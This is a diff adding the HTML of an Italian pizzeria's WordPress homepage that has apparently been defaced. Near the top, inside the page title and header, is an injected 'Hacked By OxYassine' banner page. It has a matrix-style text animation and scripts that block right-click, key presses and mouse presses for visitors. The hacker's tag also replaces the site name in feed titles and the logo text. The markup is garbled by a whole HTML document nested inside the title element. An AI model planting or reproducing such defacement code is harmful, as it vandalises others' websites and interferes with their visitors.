@@ -1,0 +1,724 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="it-IT">
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Hacked By OxYassine|<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<body bgcolor=black>
+><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<table width=100% height=100%><td align=center><br><br><br><br><br><br><br><br>
+<link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+<title>Hacked by Ox Yassine</title>
+<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
+<style type="text/css">
+h1 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+
+
+h2 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+
+h3 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+
+
+h4 {color: #FF0000;font-size: 20px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+
+
+.matrix {color: #000000; font-family:Arial, Courier, Monotype; font-size:10pt; text-align:center; width:10px; padding:0px; margin:0px;}
+.jokitz1{
+	text-align : center;
+	}
+.jokitz2{
+	text-align : center;
+	font-family : Courier;
+	}
+</style>
+
+<center>
+<br><br><br><br><br>
+	<h1>
+		Hacked By OxYassine
+	</h1>
+	<div id="matrix" class="auto-style8">	</div><br>
+</center>
+<script type="text/javascript">
+
+<!--
+
+//Disable right click script
+
+//visit http://www.rainbow.arch.scriptmania.com/scripts/
+
+var message="Sorry, right-click has been disabled";
+
+///////////////////////////////////
+
+function clickIE() {if (document.all) {(message);return false;}}
+
+function clickNS(e) {if
+
+(document.layers||(document.getElementById&&!document.all)) {
+
+if (e.which==2||e.which==3) {(message);return false;}}}
+
+if (document.layers)
+
+{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+
+else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+
+document.oncontextmenu=new Function("return false")
+
+// -->
+
+</script>
+
+<!-- <script language="JavaScript1.2" type="text/javascript">
+
+function ClearError() {return true;}
+
+window.onerror = ClearError;
+
+</script> -->
+
+
+
+
+<script type="text/javascript" language="javascript">
+
+
+
+<!--
+
+var rows=1;
+
+var speed=30; 
+
+var reveal=9;
+
+var effectalign="center"
+
+
+var w3c=document.getElementById && !window.opera;;
+
+var ie45=document.all && !window.opera;
+
+var ma_tab, matemp, ma_bod, ma_row, x, y, columns, ma_txt, ma_cho;
+
+var m_coch=new Array();
+
+var m_copo=new Array();
+
+window.onload=function() {
+
+	if (!w3c && !ie45) return
+
+  var matrix=(w3c)?document.getElementById("matrix"):document.all["matrix"];
+
+  ma_txt=(w3c)?matrix.firstChild.nodeValue:matrix.innerHTML;
+
+  ma_txt=" "+ma_txt+" ";
+
+  columns=ma_txt.length;
+
+  if (w3c) {
+
+    while (matrix.childNodes.length) matrix.removeChild(matrix.childNodes[0]);
+
+    ma_tab=document.createElement("table");
+
+    ma_tab.setAttribute("border", 3);
+
+    ma_tab.setAttribute("align", effectalign);
+
+    ma_tab.style.backgroundColor="#200000";
+
+    ma_bod=document.createElement("tbody");
+
+    for (x=0; x<rows; x++) {
+
+      ma_row=document.createElement("tr");
+
+      for (y=0; y<columns; y++) {
+
+        matemp=document.createElement("td");
+
+        matemp.setAttribute("id", "Mx"+x+"y"+y);
+
+        matemp.className="matrix";
+
+        matemp.appendChild(document.createTextNode(String.fromCharCode(160)));
+
+        ma_row.appendChild(matemp);
+
+      }
+
+      ma_bod.appendChild(ma_row);
+
+    }
+
+    ma_tab.appendChild(ma_bod);
+
+    matrix.appendChild(ma_tab);
+
+  } else {
+
+    ma_tab='<ta'+'ble align="'+effectalign+'" border="0" style="background-color:#100000">';
+
+    for (var x=0; x<rows; x++) {
+
+      ma_tab+='<t'+'r>';
+
+      for (var y=0; y<columns; y++) {
+
+        ma_tab+='<t'+'d class="matrix" id="Mx'+x+'y'+y+'"> </'+'td>';
+
+      }
+
+      ma_tab+='</'+'tr>';
+
+    }
+
+    ma_tab+='</'+'table>';
+
+    matrix.innerHTML=ma_tab;
+
+  }
+
+  ma_cho=ma_txt;
+
+  for (x=0; x<columns; x++) {
+
+    ma_cho+=String.fromCharCode(32+Math.floor(Math.random()*94));
+
+    m_copo[x]=0;
+
+  }
+
+  ma_bod=setInterval("mytricks()", speed);
+
+}
+
+
+
+function mytricks() {
+
+  x=0;
+
+  for (y=0; y<columns; y++) {
+
+    x=x+(m_copo[y]==300);
+
+    ma_row=m_copo[y]%300;
+
+    if (ma_row && m_copo[y]<300) {
+
+      if (ma_row<rows+1) {
+
+        if (w3c) {
+
+          matemp=document.getElementById("Mx"+(ma_row-1)+"y"+y);
+
+          matemp.firstChild.nodeValue=m_coch[y];
+
+        }
+
+        else {
+
+          matemp=document.all["Mx"+(ma_row-1)+"y"+y];
+
+          matemp.innerHTML=m_coch[y];
+
+        }
+
+        matemp.style.color="#81F2FF";
+
+        matemp.style.fontWeight="bold";
+
+      }
+
+      if (ma_row>1 && ma_row<rows+2) {
+
+        matemp=(w3c)?document.getElementById("Mx"+(ma_row-2)+"y"+y):document.all["Mx"+(ma_row-2)+"y"+y];
+
+        matemp.style.fontWeight="normal";
+
+        matemp.style.color="#00BBFF";
+
+      }
+
+      if (ma_row>2) {
+
+          matemp=(w3c)?document.getElementById("Mx"+(ma_row-3)+"y"+y):document.all["Mx"+(ma_row-3)+"y"+y];
+
+        matemp.style.color="#20FFDA";
+
+      }
+
+      if (ma_row<Math.floor(rows/2)+1) m_copo[y]++;
+
+      else if (ma_row==Math.floor(rows/2)+1 && m_coch[y]==ma_txt.charAt(y)) zoomer(y);
+
+      else if (ma_row<rows+2) m_copo[y]++;
+
+      else if (m_copo[y]<100) m_copo[y]=0;
+
+    }
+
+    else if (Math.random()>0.9 && m_copo[y]<100) {
+
+      m_coch[y]=ma_cho.charAt(Math.floor(Math.random()*ma_cho.length));
+
+      m_copo[y]++;
+
+    }
+
+  }
+
+  if (x==columns) clearInterval(ma_bod);
+
+}
+
+
+
+function zoomer(ycol) {
+
+  var mtmp, mtem, ytmp;
+
+  if (m_copo[ycol]==Math.floor(rows/2)+1) {
+
+    for (ytmp=0; ytmp<rows; ytmp++) {
+
+      if (w3c) {
+
+        mtmp=document.getElementById("Mx"+ytmp+"y"+ycol);
+
+        mtmp.firstChild.nodeValue=m_coch[ycol];
+
+      }
+
+      else {
+
+        mtmp=document.all["Mx"+ytmp+"y"+ycol];
+
+        mtmp.innerHTML=m_coch[ycol];
+
+      }
+
+      mtmp.style.color="#5BEEFF";
+
+      mtmp.style.fontWeight="bold";
+
+    }
+
+    if (Math.random()<reveal) {
+
+      mtmp=ma_cho.indexOf(ma_txt.charAt(ycol));
+
+      ma_cho=ma_cho.substring(0, mtmp)+ma_cho.substring(mtmp+1, ma_cho.length);
+
+    }
+
+    if (Math.random()<reveal-1) ma_cho=ma_cho.substring(0, ma_cho.length-1);
+
+    m_copo[ycol]+=199;
+
+    setTimeout("zoomer("+ycol+")", speed);
+
+  }
+
+  else if (m_copo[ycol]>200) {
+
+    if (w3c) {
+
+      mtmp=document.getElementById("Mx"+(m_copo[ycol]-201)+"y"+ycol);
+
+      mtem=document.getElementById("Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol);
+
+    }
+
+    else {
+
+      mtmp=document.all["Mx"+(m_copo[ycol]-201)+"y"+ycol];
+
+      mtem=document.all["Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol];
+
+    }
+
+    mtmp.style.fontWeight="normal";
+
+    mtem.style.fontWeight="normal";
+
+    setTimeout("zoomer("+ycol+")", speed);
+
+  }
+
+  else if (m_copo[ycol]==300) m_copo[ycol]=200+Math.floor(rows/2);
+
+  if (m_copo[ycol]>200 && m_copo[ycol]<300) {
+
+    if (w3c) {
+
+      mtmp=document.getElementById("Mx"+(m_copo[ycol]-101)+"y"+ycol);
+
+      mtmp.firstChild.nodeValue=String.fromCharCode(160);
+
+      mtem=document.getElementById("Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol);
+
+      mtem.firstChild.nodeValue=String.fromCharCode(160);
+
+    }
+
+    else {
+
+      mtmp=document.all["Mx"+(m_copo[ycol]-201)+"y"+ycol];
+
+      mtmp.innerHTML=String.fromCharCode(260);
+
+      mtem=document.all["Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol];
+
+      mtem.innerHTML=String.fromCharCode(260);
+
+    }
+
+    setTimeout("zoomer("+ycol+")", speed);
+
+  }
+
+  
+
+  //start
+
+var h1 = document.getElementsByTagName("h1")[0],
+
+text = h1.innerText || h1.textContent,
+
+split = [], i, lit = 0, timer = null;
+
+for(i = 0; i < text.length; ++i) {
+
+split.push("<span>" + text[i] + "</span>");
+
+}
+
+h1.innerHTML = split.join("");
+
+split = h1.childNodes;
+
+
+
+var flicker = function() {
+
+lit += 0.03;
+
+if(lit >= 1) {
+
+clearInterval(timer);
+
+}
+
+for(i = 0; i < split.length; ++i) {
+
+if(Math.random() < lit) {
+
+split[i].className = "neon";
+
+} else {
+
+split[i].className = "";
+
+}
+
+}
+
+}
+
+setInterval(flicker, 300);
+
+
+
+}
+
+//strat sec
+
+
+
+// end  -->
+
+</script>
+
+</head>
+</html>
+
+
+
+
+<video autoplay="" loop="" allowscriptaccess="always" allowfullscreen="false" width="1" height="0">
+
+
+	</video></p>
+		
+
+<br><br><br><br><br><br><br><br><br><br><br>
+><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<br><br>
+			
+		
+			
+			</center></header></div></body></html></title>
+
+<link rel="stylesheet" href="http://www.i-regolo.it/wp-content/themes/MyCuisine/style.css" type="text/css" media="screen" />
+<link href='http://fonts.googleapis.com/css?family=Goudy+Bookletter+1911' rel='stylesheet' type='text/css' />
+<link rel="alternate" type="application/rss+xml" title="Hacked By OxYassine RSS Feed" href="http://www.i-regolo.it/index.php/feed/" />
+<link rel="alternate" type="application/atom+xml" title="Hacked By OxYassine Atom Feed" href="http://www.i-regolo.it/index.php/feed/atom/" />
+<link rel="pingback" href="http://www.i-regolo.it/xmlrpc.php" />
+
+<!--[if lt IE 7]>
+	<link rel="stylesheet" type="text/css" href="http://www.i-regolo.it/wp-content/themes/MyCuisine/css/ie6style.css" />
+	<script type="text/javascript" src="http://www.i-regolo.it/wp-content/themes/MyCuisine/js/DD_belatedPNG_0.0.8a-min.js"></script>
+	<script type="text/javascript">DD_belatedPNG.fix('img#logo, span.overlay, a.zoom-icon, a.more-icon, #menu, #menu-right, #menu-content, ul#top-menu ul, #menu-bar, .footer-widget ul li, span.post-overlay, #content-area, .avatar-overlay, .comment-arrow, .testimonials-item-bottom, #quote, #bottom-shadow, #quote .container');</script>
+<![endif]-->
+<!--[if IE 7]>
+	<link rel="stylesheet" type="text/css" href="http://www.i-regolo.it/wp-content/themes/MyCuisine/css/ie7style.css" />
+<![endif]-->
+<!--[if IE 8]>
+	<link rel="stylesheet" type="text/css" href="http://www.i-regolo.it/wp-content/themes/MyCuisine/css/ie8style.css" />
+<![endif]-->
+
+<script type="text/javascript">
+	document.documentElement.className = 'js';
+</script>
+
+<link rel="alternate" type="application/rss+xml" title="Hacked By OxYassine &raquo; Feed" href="http://www.i-regolo.it/index.php/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Hacked By OxYassine &raquo; Feed dei commenti" href="http://www.i-regolo.it/index.php/comments/feed/" />
+		<link rel="stylesheet" href="http://www.i-regolo.it/wp-content/themes/MyCuisine/style-Brown.css" type="text/css" media="screen" />
+	<meta content="MyCuisine v.3.3" name="generator"/><link rel='stylesheet' id='et-shortcodes-css-css'  href='http://www.i-regolo.it/wp-content/themes/MyCuisine/epanel/shortcodes/css/shortcodes.css?ver=3.0' type='text/css' media='all' />
+<link rel='stylesheet' id='msl-main-css'  href='http://www.i-regolo.it/wp-content/plugins/master-slider/public/assets/css/masterslider.main.css?ver=2.0.4' type='text/css' media='all' />
+<link rel='stylesheet' id='msl-custom-css'  href='http://www.i-regolo.it/wp-content/uploads/master-slider/custom.css?ver=4.3' type='text/css' media='all' />
+<link rel='stylesheet' id='style-dares_serpent-css'  href='http://www.i-regolo.it/wp-content/plugins/len-slider/skins/dares_serpent/output/css/style.css?ver=4.1.1' type='text/css' media='all' />
+<link rel='stylesheet' id='style-vania_fit-css'  href='http://www.i-regolo.it/wp-content/plugins/len-slider/skins/vania_fit/output/css/style.css?ver=4.1.1' type='text/css' media='all' />
+<link rel='stylesheet' id='style-smart_energy-css'  href='http://www.i-regolo.it/wp-content/plugins/len-slider/skins/smart_energy/output/css/style.css?ver=4.1.1' type='text/css' media='all' />
+<link rel='stylesheet' id='style-nemo_target-css'  href='http://www.i-regolo.it/wp-content/plugins/len-slider/skins/nemo_target/output/css/style.css?ver=4.1.1' type='text/css' media='all' />
+<link rel='stylesheet' id='default-skin-css-css'  href='http://www.i-regolo.it/wp-content/plugins/len-slider/css/defaultskin.css?ver=4.1.1' type='text/css' media='all' />
+<link rel='stylesheet' id='wprmm-style-css'  href='http://www.i-regolo.it/wp-content/plugins/easy-restaurant-menu-manager/css/style.css?ver=4.1.1' type='text/css' media='all' />
+<link rel='stylesheet' id='wprmm-tooltip-style-css'  href='http://www.i-regolo.it/wp-content/plugins/easy-restaurant-menu-manager/css/wprmm-tooltip.css?ver=4.1.1' type='text/css' media='all' />
+<link rel='stylesheet' id='wprmm-custom-db-style-css'  href='http://www.i-regolo.it/?wprmm-routing=custom-css&#038;ver=1.5.1' type='text/css' media='all' />
+<link rel='stylesheet' id='fancybox-css'  href='http://www.i-regolo.it/wp-content/themes/MyCuisine/epanel/page_templates/js/fancybox/jquery.fancybox-1.3.4.css?ver=1.3.4' type='text/css' media='screen' />
+<link rel='stylesheet' id='et_page_templates-css'  href='http://www.i-regolo.it/wp-content/themes/MyCuisine/epanel/page_templates/page_templates.css?ver=1.8' type='text/css' media='screen' />
+<!-- This site uses the Google Analytics by Yoast plugin v5.3.2 - Universal enabled - https://yoast.com/wordpress/plugins/google-analytics/ -->
+<script type="text/javascript">
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');
+
+	__gaTracker('create', 'UA-43001004-1', 'auto');
+	__gaTracker('set', 'forceSSL', true);
+	__gaTracker('send','pageview');
+
+</script>
+<!-- / Google Analytics by Yoast -->
+<script type='text/javascript' src='http://www.i-regolo.it/wp-includes/js/jquery/jquery.js?ver=1.11.1'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-includes/js/jquery/ui/core.min.js?ver=1.11.2'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-includes/js/jquery/ui/effect.min.js?ver=1.11.2'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.2'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-includes/js/jquery/ui/tabs.min.js?ver=1.11.2'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-content/plugins/len-slider/js/jquery-ui-tabs-rotate.js?ver=4.1.1'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-content/plugins/len-slider/js/jquery-ui-tabs-hover.js?ver=4.1.1'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.i-regolo.it/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.i-regolo.it/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.1.1" />
+<script>var ms_grabbing_curosr = 'http://www.i-regolo.it/wp-content/plugins/master-slider/public/assets/css/common/grabbing.cur', ms_grab_curosr = 'http://www.i-regolo.it/wp-content/plugins/master-slider/public/assets/css/common/grab.cur';</script>
+<meta name="generator" content="MasterSlider 2.0.4 - Responsive Touch Image Slider | www.avt.li/msf" />
+<!-- used in scripts --><meta name="et_featured_auto_speed" content="7000" /><meta name="et_disable_toptier" content="0" /><meta name="et_featured_slider_auto" content="1" /><meta name="et_cufon" content="1" /><link rel="shortcut icon" href="http://www.i-regolo.it/wp-content/uploads/Regolo_300_dpi_trasp2.png" /><style type="text/css" id="et-custom-css">
+#breadcrumbs { display: none; }
+#logo { top: -12px; }
+#category-name { display: none; }
+#main-area .container { height: 100px !important; }
+#content { padding: 30px 0 15px; }
+.home #content { padding: 20px 0 15px; }
+#footer { display: none; }
+/*.post { padding: 0px 0px 0px 0px; }*/
+.home .slide .description { display: none; }
+.browse-menu { display: none !important; }
+.home-block .et_menu_item { height: 80px; }
+#quote { margin-bottom: 20px }
+.et_menu_row .home-block p {
+line-height: 14px;
+font-size: 11px;
+}
+</style>
+</head>
+<body class="home blog _masterslider _ms_version_2.0.4 unknown et_includes_sidebar">
+	<div id="page-bg">
+		<div id="page-bottom">
+			<div id="page-top">
+				<div id="featured">
+
+			<div class="slide active" style="background: #452917 url('http://www.i-regolo.it/wp-content/uploads/MG_6935_compress-1024x465.jpg') no-repeat top center;">
+			<div class="container">
+				<div class="description">
+					<h2 class="title"><a href="http://www.i-regolo.it/index.php/fotohome3-3/">fotohome3</a></h2>
+					<p></p>
+					<a class="readmore" href="http://www.i-regolo.it/index.php/fotohome3-3/"><span>Read More</span></a>
+				</div> <!-- .description -->
+			</div> <!-- .container -->
+			<div class="slide-top-shadow"></div>
+			<div class="slide-bottom-shadow"></div>
+		</div> <!-- .slide -->
+			<div class="slide" style="background: #452917 url('http://www.i-regolo.it/wp-content/uploads/MG_6934_compress-1024x465.jpg') no-repeat top center;">
+			<div class="container">
+				<div class="description">
+					<h2 class="title"><a href="http://www.i-regolo.it/index.php/fotohome1-2/">fotohome1</a></h2>
+					<p></p>
+					<a class="readmore" href="http://www.i-regolo.it/index.php/fotohome1-2/"><span>Read More</span></a>
+				</div> <!-- .description -->
+			</div> <!-- .container -->
+			<div class="slide-top-shadow"></div>
+			<div class="slide-bottom-shadow"></div>
+		</div> <!-- .slide -->
+			<div class="slide" style="background: #452917 url('http://www.i-regolo.it/wp-content/uploads/MG_6925_compress-1024x465.jpg') no-repeat top center;">
+			<div class="container">
+				<div class="description">
+					<h2 class="title"><a href="http://www.i-regolo.it/index.php/fotohome2-2/">fotohome2</a></h2>
+					<p></p>
+					<a class="readmore" href="http://www.i-regolo.it/index.php/fotohome2-2/"><span>Read More</span></a>
+				</div> <!-- .description -->
+			</div> <!-- .container -->
+			<div class="slide-top-shadow"></div>
+			<div class="slide-bottom-shadow"></div>
+		</div> <!-- .slide -->
+			<div class="slide" style="background: #452917 url('http://www.i-regolo.it/wp-content/uploads/image1-1024x465.jpg') no-repeat top center;">
+			<div class="container">
+				<div class="description">
+					<h2 class="title"><a href="http://www.i-regolo.it/index.php/fotohome5/">fotohome5</a></h2>
+					<p></p>
+					<a class="readmore" href="http://www.i-regolo.it/index.php/fotohome5/"><span>Read More</span></a>
+				</div> <!-- .description -->
+			</div> <!-- .container -->
+			<div class="slide-top-shadow"></div>
+			<div class="slide-bottom-shadow"></div>
+		</div> <!-- .slide -->
+			<div class="slide" style="background: #452917 url('http://www.i-regolo.it/wp-content/uploads/image-1024x465.jpg') no-repeat top center;">
+			<div class="container">
+				<div class="description">
+					<h2 class="title"><a href="http://www.i-regolo.it/index.php/fotohome4/">fotohome4</a></h2>
+					<p></p>
+					<a class="readmore" href="http://www.i-regolo.it/index.php/fotohome4/"><span>Read More</span></a>
+				</div> <!-- .description -->
+			</div> <!-- .container -->
+			<div class="slide-top-shadow"></div>
+			<div class="slide-bottom-shadow"></div>
+		</div> <!-- .slide -->
+	</div> <!-- #featured -->				<div id="main-area">
+					<div class="container">
+						<div id="menu-right"></div>
+						<div id="menu-bar">
+							<div id="menu-content" class="clearfix">
+
+
+<table style="display: inline-table; margin-left:40px" height="100%"><tr><td><a href="http://www.celiachia.it/home/HomePage.aspx" target="_blank"><img src="http://www.i-regolo.it/wp-content/uploads/AIC_logoAFC_quadro_rosso.png" width="56" height="56" style="margin-right: 20px;"></a></td><td><a href="http://guidatv.sky.it/guidatv/categorie_sport.html"><img name="index_r2_c12" src="/images/sky-logo.jpeg" width="50" height="39" border="0" id="index_r2_c12" alt=""></a></td><td>
+	<a href=""><img name="index_r2_c13" src="/images/twitter-icon.png" width="39" height="39" border="0" id="index_r2_c13" alt=""></a></td><td><a href="http://www.facebook.com/pages/pizzeria-IRegolo/332423999675?sk=info"><img name="index_r2_c13" src="/images/facebook_icon.png" width="39" height="39" border="0" id="index_r2_c13" alt=""></a></td></tr></table>
+
+
+
+								<a href="http://www.i-regolo.it/">
+																		<img src="http://www.i-regolo.it/wp-content/uploads/logo_sito4.png" alt="Hacked By OxYassine" id="logo"/>
+								</a>
+																<ul id="top-menu" class="nav"><li id="menu-item-413" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-413"><a href="http://www.i-regolo.it/">Home</a></li>
+<li id="menu-item-975" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-975"><a href="http://www.i-regolo.it/index.php/la-cucina/">La Cucina</a></li>
+<li id="menu-item-86" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-86"><a href="http://www.i-regolo.it/index.php/galleria/">Galleria</a></li>
+<li id="menu-item-155" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-155"><a href="http://www.i-regolo.it/index.php/contatti/">Contatti</a></li>
+</ul>							</div> <!-- end #menu-content-->
+						</div> <!-- end #menu-bar-->
+
+											</div> 	<!-- end .container -->
+				</div> <!-- end #main-area -->
+			</div> <!-- end #page-top -->
+							<div id="controllers">
+					<div class="container clearfix">
+						<div id="switcher">
+							<div id="switcher-right">
+								<div id="switcher-content">
+																			<a href="#" class="item active">1</a>
+																			<a href="#" class="item">2</a>
+																			<a href="#" class="item">3</a>
+																			<a href="#" class="item">4</a>
+																			<a href="#" class="item">5</a>
+																	</div> <!-- #switcher-content -->
+							</div> <!-- #switcher-right -->
+						</div> <!-- #switcher -->
+					</div> <!-- .container -->
+				</div> <!-- #controllers -->
+					</div> <!-- end #page-bottom -->
+	</div> <!-- end #page-bg -->
+
+	<div id="content-area">
+			<div id="quote">
+			<div class="container">
+				<div id="quote-shadow"></div>
+				<p id="quote-line-1">Dal 1994 abbiamo una storia d'amore con la pizza...</p>
+				<p id="quote-line-2">....non c'è amore più sincero che quello per il cibo...</p>
+<div align="center" style="position: absolute; top: 24px; left: 10px; font-family: 'Goudy Bookletter 1911', Georgia, serif; font-size: 20px; color: #654e2d; text-shadow: 1px 1px 1px #ffffff; font-style: normal; line-height: 25px;">Pizza <br />con<br /> Farina di Kamut®</div>
+<div align="right" style="position: absolute; right: 0; top: 0; margin-top: -9px;" >
+<div id="TA_certificateOfExcellence331" class="TA_certificateOfExcellence">
+<ul id="b2AYTBUNbH" class="TA_links 54M25LbW">
+<li id="baJgcvB" class="d6bZgFlMsAf">
+<a target="_blank" href="http://www.tripadvisor.it/"><img src="http://www.tripadvisor.it/img/cdsi/img2/awards/CoE2014_WidgetAsset-14348-2.png" alt="TripAdvisor" class="widCOEImg" id="CDSWIDCOELOGO"/></a>
+</li>
+</ul>
+</div>
+<script src="http://www.jscache.com/wejs?wtype=certificateOfExcellence&amp;uniq=331&amp;locationId=2372761&amp;lang=it&amp;year=2014"></script>
+</div>
+			</div> 	<!-- end .container -->
+		</div> <!-- end #quote -->
+
+	
+	<div class="container clearfix">
+		
+		<a href="#" class="browse-menu"><span>Clicca qui per sfogliare il menu</span></a>
+		<div id="bottom-shadow"></div>
+	</div> 	<!-- end .container -->
+
+	</div> <!-- end #content-area -->
+
+	<div id="footer">
+		<div class="container">
+			
+			<div id="footer-bottom" class="clearfix">
+				<ul class="bottom-menu">				<li class="current_page_item"><a href="http://www.i-regolo.it">Home</a></li>
+			<li class="page_item page-item-918"><a href="http://www.i-regolo.it/index.php/la-cucina/">La Cucina</a></li>
+<li class="page_item page-item-465"><a href="http://www.i-regolo.it/index.php/news/">News</a></li>
+<li class="page_item page-item-309"><a href="http://www.i-regolo.it/index.php/menu/">Menu</a></li>
+<li class="page_item page-item-93"><a href="http://www.i-regolo.it/index.php/contatti/">Contatti</a></li>
+<li class="page_item page-item-59"><a href="http://www.i-regolo.it/index.php/galleria/">Galleria</a></li>
+</ul>				<p id="copyright">Progettato da <a href="http://www.elegantthemes.com" title="Premium WordPress Themes">Elegant WordPress Themes</a> | Prodotto da <a href="http://www.wordpress.org">WordPress</a></p>
+			</div> 	<!-- end #footer-bottom -->
+		</div> 	<!-- end .container -->
+	</div> <!-- end #footer -->
+
+	<script src="http://www.i-regolo.it/wp-content/themes/MyCuisine/js/cufon-yui.js" type="text/javascript"></script>
+<script src="http://www.i-regolo.it/wp-content/themes/MyCuisine/js/League_Gothic_400.font.js" type="text/javascript"></script>
+<script src="http://www.i-regolo.it/wp-content/themes/MyCuisine/js/superfish.js" type="text/javascript"></script>
+<script src="http://www.i-regolo.it/wp-content/themes/MyCuisine/js/custom.js" type="text/javascript"></script>	<script type='text/javascript' src='http://www.i-regolo.it/wp-content/plugins/easy-restaurant-menu-manager/js/bootstrap-tooltip.js?ver=2.0.1'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-content/plugins/easy-restaurant-menu-manager/js/wprmm.js?ver=1.0.0'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-content/plugins/len-slider/js/default.skin.js?ver=2.0.11'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-content/plugins/len-slider/skins/dares_serpent/output/js/dares_serpent.skin.js?ver=2.0.11'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-content/plugins/len-slider/skins/vania_fit/output/js/vania_fit.skin.js?ver=2.0.11'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-content/plugins/len-slider/skins/smart_energy/output/js/smart_energy.skin.js?ver=2.0.11'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-content/plugins/len-slider/skins/nemo_target/output/js/nemo_target.skin.js?ver=2.0.11'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-content/themes/MyCuisine/epanel/page_templates/js/fancybox/jquery.easing-1.3.pack.js?ver=1.3.4'></script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-content/themes/MyCuisine/epanel/page_templates/js/fancybox/jquery.fancybox-1.3.4.pack.js?ver=1.3.4'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var et_ptemplates_strings = {"captcha":"Captcha","fill":"Inserisci","field":"campo","invalid":"Email non corretta"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.i-regolo.it/wp-content/themes/MyCuisine/epanel/page_templates/js/et-ptemplates-frontend.js?ver=1.1'></script>
+<style type="text/css"></style><script type="text/javascript">jQuery(document).ready(function(){dares_serpent_lenslider_fn({"skin":{"ls_slider_comment":"La Cucina","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"dares_serpent","banners_disen":[1],"ls_images_maxwidth":10},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":300},"slideshow":{"ls_has_autoplay":1,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});dares_serpent_lenslider_fn({"skin":{"ls_slider_comment":"","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"vania_fit","banners_disen":[1],"ls_images_maxwidth":1},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":300},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});dares_serpent_lenslider_fn({"skin":{"ls_slider_comment":"","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"smart_energy","banners_disen":[1,1],"ls_images_maxwidth":1},"thumbs":{"ls_has_thumb":1,"ls_thumb_max_width":50},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});dares_serpent_lenslider_fn({"skin":{"ls_slider_comment":"","ls_